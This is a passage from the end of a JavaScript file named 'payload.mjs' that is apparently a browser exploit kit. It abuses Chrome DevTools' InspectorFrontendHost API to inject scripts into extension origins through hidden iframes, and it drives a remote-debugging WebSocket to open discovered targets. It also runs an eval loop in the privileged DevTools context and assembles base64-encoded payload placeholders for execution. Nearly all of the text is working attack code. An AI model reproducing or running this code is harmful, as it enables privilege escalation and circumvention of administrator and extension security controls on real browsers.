                         } else { console.error("Failed to open target window."); window.cleanup(); }
                    }
                };`;
             // --- End Injection Script ---

             const extensionOrigin = `chrome-extension://${extensionId}`;
             console.log(`Injecting for origin: ${extensionOrigin}`);
             try {
                 if (!window.InspectorFrontendHost || typeof window.InspectorFrontendHost.setInjectedScriptForOrigin !== 'function') {
                     throw new Error("InspectorFrontendHost API not available.");
                 }
                 InspectorFrontendHost.setInjectedScriptForOrigin(extensionOrigin, injectionWrapper);

                 const iframe = document.createElement("iframe");
                 iframe.src = `${extensionOrigin}${manifestPath}`;
                 iframe.style.display = 'none';
                 document.body.appendChild(iframe);
                 const iframeId = iframeManager.add(iframe);
                 updateIframeLog();

                 iframe.onload = () => {
                    console.log(`Iframe ${iframeId} loaded. Posting config.`);
                    iframe.contentWindow?.postMessage({ type: IFRAME_TRACKER_EVENT_UID_PASS, passcode: iframeId, cleanup: isCleanup }, extensionOrigin); // Target origin
                 };
                 iframe.onerror = (e) => { console.error(`Iframe ${iframeId} load error:`, e); iframeManager.remove(iframeId); updateIframeLog(); };

             } catch (e) { console.error(`Error interacting with ${extensionId}:`, e); alert(`Interaction Error: ${e.message}`); }
         } // end debugExtensionInteraction

        /** Updates the display log of active iframes */
        function updateIframeLog() {
             const logEl = document.getElementById('log');
             if (logEl) {
                const ids = Object.keys(iframeManager.iframes);
                logEl.textContent = `Active Iframes: ${ids.length}\\n` + ids.map(id => ` - ID ${id}: ${iframeManager.iframes[id].src}`).join('\\n');
             }
        }

        /** Handles the 'Check for Updater' button click */
        function handleUpdaterCheck() {
            const wsUrl = UPDATER_WEBSOCKET_PLACEHOLDER; // Use constant defined above
            console.log("Checking updater via WebSocket:", wsUrl);
             if (wsUrl.includes("%%")) { alert("Updater URL placeholder invalid."); return; }

             const previousOnUnload = window.onunload; window.onunload = null; // Disable unload blocker
             let ws; try { ws = new WebSocket(wsUrl); } catch (e) { alert(`WS Connect Error: ${e.message}`); window.onunload = previousOnUnload; return; }

             ws.onopen = () => ws.send(JSON.stringify({ method: "Target.setDiscoverTargets", id: Date.now(), params: { discover: true } }));
             ws.onmessage = (event) => {
                 try {
                     const msg = JSON.parse(event.data);
                     // Simplified logic: look for any URL in response params to navigate to
                     const targetUrl = msg?.params?.request?.url || msg?.params?.targetInfo?.url; // Adapt based on actual protocol
                     if (targetUrl) {
                         console.log("Updater found URL:", targetUrl);
                         ws.close();
                         const interWin = window.open('', '_blank');
                         if (interWin) {
                             try { interWin.eval(`setTimeout(()=>{opener?.open("${targetUrl.replace(/"/g, '\\"')}","_blank");window.close();},50)`); } catch(e){console.error("Intermediate win eval failed:",e); try{interWin.close();}catch(e2){}}
                             setTimeout(() => { location.reload(); }, 800); // Reload DevTools
                         } else { alert("Failed to open intermediate window."); window.onunload = previousOnUnload;}
                     }
                 } catch (e) { console.error("WS message processing error:", e); }
             };
             ws.onerror = (e) => { alert("WebSocket error."); console.error("WS Error:", e); window.onunload = previousOnUnload; };
             ws.onclose = (e) => { console.log(`WS closed: ${e.code}`); window.onunload = previousOnUnload; };
        } // end handleUpdaterCheck

        /** Handles the 'Debug DevTools (Eval)' button */
        function handleDevtoolsDebugEval() {
            console.warn("Entering DevTools eval loop. Type 'cancelEvalLoop' property to stop.");
            let cancelled = false; let evalTimeoutId = null;
             Object.defineProperty(window, 'cancelEvalLoop', { get:()=>{ console.log("Eval loop cancelled."); cancelled=true; if(evalTimeoutId)clearTimeout(evalTimeoutId); delete window.cancelEvalLoop; return "Loop cancelled."; }, configurable:true });
             function promptAndEval() {
                 if(cancelled)return;
                 try { const code = prompt("Eval in DevTools context ('cancel' to stop):"); if(code===null||code.toLowerCase()==='cancel'){ if(!cancelled)window.cancelEvalLoop; return; } if(code.trim()===''){ evalTimeoutId=setTimeout(promptAndEval,0); return; } console.log("Evaluating:",code); const result = new Function(code)(); console.log("Result:",result); } catch(e){ console.error("Eval error:",e); } if(!cancelled){ evalTimeoutId=setTimeout(promptAndEval,0); }
             }
             evalTimeoutId = setTimeout(promptAndEval, 0);
        } // end handleDevtoolsDebugEval

        // --- Initialize ---
        try { setupUI(); } catch(e) { console.error("Fatal UI setup error:", e); document.body.innerHTML = `<h1 style="color:red">Error</h1><pre>${e.stack}</pre>`; }

    } // end devToolsUI function


    // --- Main Execution Flow ---

    async function main() {
        console.log("payload.mjs starting...");
        const openerWindow = getOpener();

        try {
            const devtoolsWindow = await openDevToolsAndGetAPI(openerWindow);

            // Prepare the devToolsUI function string with placeholders replaced
            let devToolsUIString = devToolsUI.toString();
            devToolsUIString = devToolsUIString.replaceAll('%%PLACEHOLDER_HTML_ENTRY_B64%%', PLACEHOLDER_HTML_ENTRY_B64);
            devToolsUIString = devToolsUIString.replaceAll('%%PLACEHOLDER_EXT_JS_B64%%', PLACEHOLDER_EXT_JS_B64);
            devToolsUIString = devToolsUIString.replaceAll('%%PLACEHOLDER_EXT_HTML_B64%%', PLACEHOLDER_EXT_HTML_B64);
            devToolsUIString = devToolsUIString.replaceAll('%%PLACEHOLDER_CHROME_PAYLOAD_B64%%', PLACEHOLDER_CHROME_PAYLOAD_B64);
            // Note: %%updaterurl%% placeholder remains within the string for later use by handleUpdaterCheck

            console.log("Executing UI setup in DevTools window context...");
            // Execute the fully formed string in the DevTools window
            devtoolsWindow.eval(`(${devToolsUIString})()`);

            console.log("UI setup initiated in DevTools window. Closing this helper window.");
            window.close();

        } catch (error) {
            console.error("Critical error in payload.mjs:", error);
            alert(`Failed to initialize: ${error.message}`);
        }
    }

    // Start the process
    main();

})()
